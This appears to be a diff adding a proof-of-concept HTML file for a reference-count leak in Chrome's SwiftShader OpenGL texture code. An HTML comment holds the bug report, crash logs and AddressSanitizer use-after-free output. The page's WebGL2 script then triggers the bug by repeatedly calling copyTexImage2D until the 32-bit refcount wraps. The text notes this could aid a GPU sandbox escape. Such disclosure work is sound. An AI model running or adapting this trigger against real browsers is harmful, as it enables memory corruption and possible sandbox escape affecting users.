@@ -1,0 +1,187 @@
+<!--
+There's an object lifetime issue in the Swiftshader OpenGL texture bindings (OpenGL/libGLESv2/Texture.cpp).
+
+The same bug is present in all versions of TextureXX::copyImage, below is the simplest function:
+
+void Texture2D::copyImage(GLint level, GLenum internalformat, GLint x, GLint y, GLsizei width, GLsizei height, Renderbuffer *source)
+{
+	egl::Image *renderTarget = source->getRenderTarget();
+
+	if(!renderTarget)
+	{
+		ERR("Failed to retrieve the render target.");
+		return error(GL_OUT_OF_MEMORY);
+	}
+
+	if(image[level])
+	{
+		image[level]->release();
+	}
+
+	image[level] = egl::Image::create(this, width, height, internalformat);
+
+	if(!image[level])
+	{
+		return error(GL_OUT_OF_MEMORY);
+	}
+
+	if(width != 0 && height != 0)
+	{
+		sw::SliceRect sourceRect(x, y, x + width, y + height, 0);
+		sourceRect.clip(0, 0, renderTarget->getWidth(), renderTarget->getHeight());
+
+		copy(renderTarget, sourceRect, 0, 0, 0, image[level]);
+	}
+
+	renderTarget->release();
+}
+
+egl::Image objects are manually reference counted with a 32-bit reference count (see OpenGL/common/Object{.hpp,.cpp}), using addRef/release, and there is an error path here (when egl::Image::create fails) where the reference taken on renderTarget by source->getRenderTarget() is never dropped.
+
+I haven't verified that this bug can be reached in stable - I'm looking at the code for the latest dev, and various changes have been made to the allocations of egl::Image in dev in the fixes to crbug.com/835299 - the attached PoC is tested against 68.0.3440.7, and for versions prior to the fixes I think a different strategy (or at least texture sizes) will be needed to cause the allocations to fail.
+
+(In 68.0.3440.7, it's possible to create allocations such that the initial texture allocation succeeds, but that the size of the equivalent cube map texture will fail, since cube maps get an additional border pixel - this is the strategy used in the PoC).
+
+Note also that the PoC is triggering the bug directly from javascript - this will take some time! Approximately an hour for me, significantly longer for an ASAN build. This would be much quicker with direct asynchronous access to the GPU command buffer interface, so with an additional renderer bug just using this bug just for sandbox escape.
+
+[144553:144553:0604/113443.369302:ERROR:gpu_process_transport_factory.cc(1016)] Lost UI shared context.
+[144553:144602:0604/113443.474027:ERROR:object_proxy.cc(616)] Failed to call method: org.freedesktop.Notifications.GetCapabilities: object_path= /org/freedeskt
+[144610:144610:0604/113445.417389:ERROR:gles2_cmd_decoder.cc(14816)] [.Offscreen-For-WebGL-0x1b0d726ad000]GL ERROR :GL_OUT_OF_MEMORY : glCopyTexImage2D:
+Received signal 11 SEGV_MAPERR ffffc58ecd269cf1
+#0 0x55df80ab5d0c base::debug::StackTrace::StackTrace()
+#1 0x55df80ab5871 base::debug::(anonymous namespace)::StackDumpSignalHandler()
+#2 0x7f73116670c0 <unknown>
+#3 0x7f73028d0638 <unknown>
+#4 0x7f73028db9ed <unknown>
+#5 0x7f73028dcfb4 <unknown>
+#6 0x7f73028dfb96 <unknown>
+#7 0x55df813cd2ae gl::GLApiBase::glCopyTexImage2DFn()
+#8 0x55df818c6d7c gpu::gles2::GLES2DecoderImpl::DoCopyTexImage2D()
+#9 0x55df8188f4e5 gpu::gles2::GLES2DecoderImpl::HandleCopyTexImage2D()
+#10 0x55df818b31b7 gpu::gles2::GLES2DecoderImpl::DoCommandsImpl<>()
+#11 0x55df81875f88 gpu::CommandBufferService::Flush()
+#12 0x55df81c57465 gpu::CommandBufferStub::OnAsyncFlush()
+#13 0x55df81c5729f _ZN3IPC8MessageTI35GpuCommandBufferMsg_AsyncFlush_MetaNSt3__15tupleIJijbEEEvE8DispatchIN3gpu17CommandBufferStubES8_vMS8_FvijbEEEbPKNS_7MessageEPT_PT0_PT1_T2_
+#14 0x55df81c561cb gpu::CommandBufferStub::OnMessageReceived()
+#15 0x55df81c54587 gpu::GpuChannel::HandleMessageHelper()
+#16 0x55df81c52b25 gpu::GpuChannel::HandleMessage()
+#17 0x55df81c5d950 gpu::Scheduler::RunNextTask()
+#18 0x55df80a2c34c base::debug::TaskAnnotator::RunTask()
+#19 0x55df80a44887 base::MessageLoop::RunTask()
+#20 0x55df80a44d67 base::MessageLoop::DoWork()
+#21 0x55df80a4775f base::(anonymous namespace)::WorkSourceDispatch()
+#22 0x7f730f77df07 g_main_context_dispatch
+#23 0x7f730f77e138 <unknown>
+#24 0x7f730f77e1cc g_main_context_iteration
+#25 0x55df80a47622 base::MessagePumpGlib::Run()
+#26 0x55df80a642c5 base::RunLoop::Run()
+#27 0x55df83d9b9de content::GpuMain()
+#28 0x55df80771bc6 content::ContentMainRunnerImpl::Run()
+#29 0x55df8077abb2 service_manager::Main()
+#30 0x55df8076fc64 content::ContentMain()
+#31 0x55df7ed481b3 ChromeMain
+#32 0x7f730b8f92b1 __libc_start_main
+#33 0x55df7ed4802a _start
+  r8: 0000000000000001  r9: 0000000000000000 r10: 0000000000000000 r11: 0000000000000010
+ r12: 0000000000000000 r13: 000000000001ffe0 r14: 0000000000000000 r15: 0000000000001440
+  di: 00003a739c2293c0  si: 0000000000000000  bp: 0000000000000000  bx: 00003a739c2293c0
+  dx: 0000000000000000  ax: ffffc58ecd269ce1  cx: 0000000000000000  sp: 00007ffe0e7af580
+  ip: 00007f73028d0638 efl: 0000000000010246 cgf: 002b000000000033 erf: 0000000000000005
+ trp: 000000000000000e msk: 0000000000000000 cr2: ffffc58ecd269cf1
+[end of stack trace]
+Calling _exit(1). Core file will not be generated.
+
+
+=================================================================
+==145933==ERROR: AddressSanitizer: heap-use-after-free on address 0x61100001d208 at pc 0x7f66d7569d00 bp 0x7ffcb4922af0 sp 0x7ffcb4922ae8
+READ of size 8 at 0x61100001d208 thread T0 (chrome)
+==145933==WARNING: invalid path to external symbolizer!
+==145933==WARNING: Failed to use and restart external symbolizer!
+    #0 0x7f66d7569cff in es2::Colorbuffer::getRenderTarget() /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/OpenGL/libGLESv2/Renderbuffer.cpp:538:18
+    #1 0x7f66d75806d1 in es2::CopyTexImage2D(unsigned int, int, unsigned int, int, int, int, int, int) /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/OpenGL/libGLESv2/libGLESv2.cpp:1037:13
+
+0x61100001d208 is located 200 bytes inside of 240-byte region [0x61100001d140,0x61100001d230)
+freed by thread T0 (chrome) here:
+    #0 0x55ec7d63dbd2 in operator delete(void*) _asan_rtl_:3
+    #1 0x7f66d7578d35 in es2::TextureCubeMap::copyImage(unsigned int, int, unsigned int, int, int, int, int, es2::Renderbuffer*) /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/OpenGL/libGLESv2/Texture.cpp:1285:16
+    #2 0x7f66d75806d1 in es2::CopyTexImage2D(unsigned int, int, unsigned int, int, int, int, int, int) /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/OpenGL/libGLESv2/libGLESv2.cpp:1037:13
+
+previously allocated by thread T0 (chrome) here:
+    #0 0x55ec7d63cf92 in operator new(unsigned long) _asan_rtl_:3
+    #1 0x7f66d718613d in egl::Image::create(int, int, int, int, bool) /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/OpenGL/common/Image.cpp:1234:10
+
+SUMMARY: AddressSanitizer: heap-use-after-free (/ssd/chrome/src/out/asan/swiftshader/libGLESv2.so+0x6d4cff)
+Shadow bytes around the buggy address:
+  0x0c227fffb9f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c227fffba00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c227fffba10: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
+  0x0c227fffba20: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+  0x0c227fffba30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+=>0x0c227fffba40: fd[fd]fd fd fd fd fa fa fa fa fa fa fa fa fa fa
+  0x0c227fffba50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c227fffba60: 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa
+  0x0c227fffba70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c227fffba80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c227fffba90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==145933==ABORTING
+-->
+
+<html>
+  <head>
+  </head>
+  <body onload="start()">
+    <canvas id='gl' width='128' height='128' />
+    <script>
+function web(gl) {
+  const width = 8190;
+  const height = 8190;
+
+  var src_fb = gl.createFramebuffer();
+  gl.bindFramebuffer(gl.READ_FRAMEBUFFER, src_fb);
+
+  var src_rb = gl.createRenderbuffer();
+  gl.bindRenderbuffer(gl.RENDERBUFFER, src_rb);
+  gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA32UI, width, height);
+  gl.framebufferRenderbuffer(gl.READ_FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, src_rb);
+
+  dst_tex = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_CUBE_MAP, dst_tex);
+  for (var i = 3; i < 0x100000000; ++i) {
+    gl.copyTexImage2D(gl.TEXTURE_CUBE_MAP_POSITIVE_X, 0, gl.RGBA32UI, 0, 0, width, height, 0);
+  }
+
+  gl.copyTexImage2D(gl.TEXTURE_CUBE_MAP_POSITIVE_X, 0, gl.RGBA32UI, 0, 0, 16, 16, 0);
+  gl.copyTexImage2D(gl.TEXTURE_CUBE_MAP_POSITIVE_X, 0, gl.RGBA32UI, 0, 0, 16, 16, 0);
+}
+
+function start() {
+  var canvas = document.getElementById('gl');
+  var gl = canvas.getContext('webgl2');
+
+  if (gl) {
+    web(gl);
+  }
+}
+    </script>
+  </body>
+</html>
